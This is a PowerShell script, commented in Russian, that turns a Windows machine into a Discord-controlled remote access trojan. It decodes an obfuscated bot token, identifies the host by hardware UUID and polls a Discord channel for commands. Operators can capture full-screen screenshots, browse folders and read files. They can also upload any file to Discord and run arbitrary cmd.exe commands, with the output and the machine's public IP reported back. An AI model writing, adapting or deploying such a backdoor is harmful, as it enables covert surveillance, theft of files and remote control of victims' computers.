function Get {
    $encoded = @(123, 131, 160, 105, 149, 132, 136, 158, 95, 147, 105, 162, 106, 98, 127, 172, 126, 118, 125, 171, 172, 139, 145, 130, 136, 132, 168, 123, 115, 128, 117, 134, 132, 121, 120, 160, 127, 149, 96, 147, 104, 115, 101, 138, 121, 96, 131, 129, 102, 149, 172, 128, 101, 119, 134, 127, 103, 149, 172, 128, 102, 153, 134, 128, 99, 119, 156, 127, 169, 131, 134, 127)
    $decoded = ""
    for ($i = $encoded.Length - 1; $i -ge 0; $i--) {
        $decoded += [char]($encoded[$i] - 50)
    }
    return $decoded
}

$API_KEY = Get
$CHANNEL_ID = "902578959508734020"
$hwid = Get-WmiObject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
$CLIENT_ID = $hwid.Substring(0,8)

$lastMessageId = ""
$running = $true
$script:currentPath = $env:USERPROFILE 

# --- ФУНКЦИИ DISCORD ---

function Send-DiscordMessage {
    param([string]$content)
    
    $headers = @{
        "Authorization" = "Bot $API_KEY"
        "Content-Type" = "application/json; charset=utf-8"
        "User-Agent" = "DiscordBot (PowerShellMonitor, 1.0)"
    }

    $escapedContent = $content -replace '\\', '\\' -replace '"', '\"' -replace "`n", '\n' -replace "`r", ''
    $jsonBody = "{`"content`":`"$escapedContent`"}"

    try {
        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$CHANNEL_ID/messages" `
            -Method Post `
            -Headers $headers `
            -Body ([System.Text.Encoding]::UTF8.GetBytes($jsonBody)) `
            -ContentType "application/json; charset=utf-8" | Out-Null
    } catch {}
}

function Send-DiscordFile {
    param(
        [string]$filePath,
        [string]$message = ""
    )

    if (-not (Test-Path $filePath)) {
        Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Файл не найден: $($filePath)"
        return
    }

    try {
        $boundary = "----WebKitFormBoundary" + (Get-Date).Ticks
        $headers = @{
            "Authorization" = "Bot $API_KEY"
            "User-Agent" = "DiscordBot (PowerShellMonitor, 1.0)"
        }

        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)

        $bodyLines = New-Object System.Collections.Generic.List[byte]

        if ($message) {
            $contentPart = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n$message`r`n"
            $bodyLines.AddRange([System.Text.Encoding]::UTF8.GetBytes($contentPart))
        }

        $filePart = "--$boundary`r`nContent-Disposition: form-data; name=`"files[0]`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
        $bodyLines.AddRange([System.Text.Encoding]::UTF8.GetBytes($filePart))
        $bodyLines.AddRange($fileBytes)
        $bodyLines.AddRange([System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n"))

        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$CHANNEL_ID/messages" `
            -Method Post `
            -Headers $headers `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $bodyLines.ToArray() | Out-Null

    } catch {
        Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка при загрузке файла: $($_.Exception.Message)"
    }
}

function Send-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DPI {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
"@
        [DPI]::SetProcessDPIAware() | Out-Null
    } catch {}

    $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)

    $tempFile = "$env:TEMP\screenshot_$(Get-Date -Format 'HHmmss').png"
    $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()

    try {
        $boundary = "----WebKitFormBoundary" + (Get-Date).Ticks

        $headers = @{
            "Authorization" = "Bot $API_KEY"
            "User-Agent" = "DiscordBot (PowerShellMonitor, 1.0)"
        }

        $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)

        $bodyLines = New-Object System.Collections.Generic.List[byte]

        $contentPart = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n**[$CLIENT_ID] Screenshot**`r`n"
        $bodyLines.AddRange([System.Text.Encoding]::UTF8.GetBytes($contentPart))

        $filePart = "--$boundary`r`nContent-Disposition: form-data; name=`"files[0]`"; filename=`"screenshot.png`"`r`nContent-Type: image/png`r`n`r`n"
        $bodyLines.AddRange([System.Text.Encoding]::UTF8.GetBytes($filePart))
        $bodyLines.AddRange($fileBytes)
        $bodyLines.AddRange([System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n"))

        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$CHANNEL_ID/messages" `
            -Method Post `
            -Headers $headers `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $bodyLines.ToArray() | Out-Null

    } catch {}

    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
}

# --- УПРАВЛЕНИЕ КОМАНДАМИ ---

function Invoke-Command {
    param([string]$command)
    
    try {
        $output = cmd.exe /c $command 2>&1 | Out-String
        
        if ($output) {
            $output = $output.Trim()
            $formattedOutput = "``````powershell`n$output`n``````"
            Send-DiscordMessage -content "**[$CLIENT_ID]** Вывод команды:`n$formattedOutput"
        } else {
            Send-DiscordMessage -content "**[$CLIENT_ID]** Команда выполнена, вывод пуст."
        }
    } catch {
        Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка выполнения: $($_.Exception.Message)"
    }
}

# --- ФАЙЛОВЫЙ МЕНЕДЖЕР ---

function File-Manager {
    param(
        [string]$command,
        [string]$argument
    )
    
    # Сменить директорию
    if ($command -eq "cd") {
        if ([string]::IsNullOrWhiteSpace($argument)) {
            # Если аргумент пустой, просто показываем текущий путь
            Show-CurrentDirectory
            return
        }

        try {
            # Проверяем, является ли аргумент абсолютным путем
            if ([System.IO.Path]::IsPathRooted($argument)) {
                # Абсолютный путь
                if (Test-Path $argument -PathType Container) {
                    $script:currentPath = (Resolve-Path $argument).Path
                    Show-CurrentDirectory
                } else {
                    Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Путь не найден или не является папкой: $argument"
                }
            } else {
                # Относительный путь от текущей директории
                $newPath = Join-Path $script:currentPath $argument
                if (Test-Path $newPath -PathType Container) {
                    $script:currentPath = (Resolve-Path $newPath).Path
                    Show-CurrentDirectory
                } else {
                    Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Папка не найдена: $argument"
                }
            }
        } catch {
            Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка CD: $($_.Exception.Message)"
        }
        return
    }

    # Просмотр файла
    if ($command -eq "cat") {
        $fullPath = Join-Path $script:currentPath $argument
        if (-not (Test-Path $fullPath -PathType Leaf)) {
            Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Файл не найден."
            return
        }
        
        try {
            $content = Get-Content $fullPath -TotalCount 20 | Out-String
            $content = $content.Trim()
            Send-DiscordMessage -content "**[$CLIENT_ID]** Содержимое $($argument) (20 строк):`n``````$content`n``````"
        } catch {
            Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Нет доступа или файл слишком большой."
        }
        return
    }

    # Скачивание файла
    if ($command -eq "get") {
        $fullPath = Join-Path $script:currentPath $argument
        Send-DiscordFile -filePath $fullPath -message "**[$CLIENT_ID]** Загрузка файла: $($argument)"
        return
    }
}

function Show-CurrentDirectory {
    if (-not (Test-Path $script:currentPath -PathType Container)) {
        Send-DiscordMessage -content "**[$CLIENT_ID]** Ошибка: Текущий путь не является папкой."
        return
    }

    $items = Get-ChildItem -Path $script:currentPath -ErrorAction SilentlyContinue | Select-Object Name, PSIsContainer, Length
    
    $output = "**Текущий путь:** ``$script:currentPath```n`n"
    
    $folders = $items | Where-Object {$_.PSIsContainer}
    $files = $items | Where-Object {-not $_.PSIsContainer}
    
    $output += "**Папки:** " + $folders.Count + "`n"
    $folders | ForEach-Object {
        $output += "  [DIR] $($_.Name)`n"
    }
    
    $output += "`n**Файлы:** " + $files.Count + "`n"
    $files | ForEach-Object {
        $size = [math]::Round($_.Length / 1KB, 2)
        $output += "  [FILE] $($_.Name) ($size KB)`n"
    }
    
    Send-DiscordMessage -content $output.Trim()
}

function Show-Help {
    $helpText = @"
**[$CLIENT_ID] Доступные команды:**

``!$CLIENT_ID`` - Показать статус системы
``!$CLIENT_ID screen`` - Сделать скриншот
``!$CLIENT_ID cd [путь]`` - Сменить директорию и показать содержимое
``!$CLIENT_ID cat [файл]`` - Показать содержимое файла (20 строк)
``!$CLIENT_ID get [файл]`` - Скачать файл
``!$CLIENT_ID run [команда]`` - Выполнить команду CMD
``!$CLIENT_ID help`` - Показать эту справку
``!$CLIENT_ID all`` - Статус всех

**Примеры:**
``!$CLIENT_ID cd C:\Users\`` - Перейти в папку по полному пути
``!$CLIENT_ID cd Documents`` - Перейти в подпапку Documents
``!$CLIENT_ID cd ..`` - Перейти на уровень выше
``!$CLIENT_ID cat file.txt`` - Прочитать файл
``!$CLIENT_ID get important.docx`` - Скачать файл
``!$CLIENT_ID run ipconfig`` - Выполнить команду
"@
    Send-DiscordMessage -content $helpText
}

# --- ГЛАВНЫЙ ЦИКЛ ОБРАБОТКИ ---

function Check-Commands {
    $headers = @{
        "Authorization" = "Bot $API_KEY"
        "User-Agent" = "DiscordBot (PowerShellMonitor, 1.0)"
    }

    try {
        $messages = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$CHANNEL_ID/messages?limit=1" `
            -Method Get -Headers $headers

        if ($messages.Count -gt 0) {
            $message = $messages[0]

            if ($script:lastMessageId -eq "") {
                $script:lastMessageId = $message.id
                return
            }

            if ($message.id -eq $script:lastMessageId) {
                return
            }

            $script:lastMessageId = $message.id
            $content = $message.content.Trim()
            
            $match = $content | Select-String -Pattern "^(?:!all|!$CLIENT_ID(?:\s+(\w+)(?:\s+(.*))?)?)$"
            
            if ($match) {
                $command = if ($match.Matches[0].Groups[1].Success) { $match.Matches[0].Groups[1].Value.ToLower() } else { "" }
                $argument = if ($match.Matches[0].Groups[2].Success) { $match.Matches[0].Groups[2].Value.Trim() } else { "" }
                
                if ($command -eq "") {
                    $uptime = (Get-Date) - $script:startTime
                    $uptimeStr = "{0}ч {1}м" -f [math]::Floor($uptime.TotalHours), $uptime.Minutes

                    try {
                        $ip = Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 3
                    } catch {
                        $ip = "N/A"
                    }

                    $osInfo = Get-WmiObject Win32_OperatingSystem
                    $status = "**[$CLIENT_ID] Статус:**`nУстройство: $env:COMPUTERNAME`nОС: $($osInfo.Caption)`nIP: $ip`nUptime: $uptimeStr`nТекущий путь: ``$($script:currentPath)``"

                    Send-DiscordMessage -content $status
                }
                elseif ($content -match "^!all$") {
                    $uptime = (Get-Date) - $script:startTime
                    $uptimeStr = "{0}ч {1}м" -f [math]::Floor($uptime.TotalHours), $uptime.Minutes
                    Send-DiscordMessage -content "**[$CLIENT_ID] Активна** - Uptime: $uptimeStr`nТекущий путь: ``$($script:currentPath)``"
                }
                elseif ($command -eq "help") {
                    Show-Help
                }
                elseif ($command -eq "run") {
                    Invoke-Command -command $argument
                }
                elseif ($command -eq "cd") {
                    File-Manager -command $command -argument $argument
                }
                elseif ($command -eq "cat" -or $command -eq "get") {
                    File-Manager -command $command -argument $argument
                }
                elseif ($command -eq "screen") {
                    Send-Screenshot
                }
                else {
                    Send-DiscordMessage -content "**[$CLIENT_ID]** Неизвестная команда: $command`nИспользуйте ``!$CLIENT_ID help`` для справки"
                }
            }
        }
    } catch {}
}

# --- ЗАПУСК ---

$script:startTime = Get-Date
Send-DiscordMessage -content "**``$CLIENT_ID``** - ONLINE`nТекущий путь: ``$script:currentPath``"

try {
    while ($running) {
        Check-Commands
        Start-Sleep -Seconds 2
    }
} finally {
    $uptime = (Get-Date) - $script:startTime
    $uptimeStr = "{0}ч {1}м" -f [math]::Floor($uptime.TotalHours), $uptime.Minutes
    Send-DiscordMessage -content "**``$CLIENT_ID``** - OFFLINE`nUptime: $uptimeStr"
}